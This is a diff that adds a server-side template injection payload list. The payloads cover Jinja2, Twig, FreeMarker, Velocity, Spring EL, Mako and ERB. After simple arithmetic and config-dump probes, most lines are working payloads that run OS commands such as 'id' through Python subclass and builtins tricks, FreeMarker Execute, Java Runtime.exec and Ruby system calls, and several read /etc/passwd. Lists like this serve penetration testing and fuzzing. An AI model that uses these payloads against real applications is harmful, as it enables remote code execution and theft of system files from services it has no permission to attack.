@@ -1,0 +1,42 @@
+{{1337*1337}}
+${1337*1337}
+<%= 1337*1337 %>
+#{1337*1337}
+*{1337*1337}
+{{1337*'1337'}}
+{{1337+1337}}
+${1337+1337}
+{{'1337'*1337}}
+{{config}}
+{{self}}
+{{config.items()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].popen('id').read()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('system')}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+${"freemarker.template.utility.Execute"?new()("id")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+#set($e="e")#set($v="val")#set($x=$e+$v)$x("id")
+#set($str=$class.inspect("java.lang.String").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+${T(java.lang.String).getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
+${self.module.cache.util.os.popen('id').read()}
+${import os;os.popen('id').read()}
+<%= system('id') %>
+<%= `id` %>
+<%= Kernel.system("id") %>
+<%= File.open('/etc/passwd').read %>
+{{}}
+${}
+<%= %>
+<# >
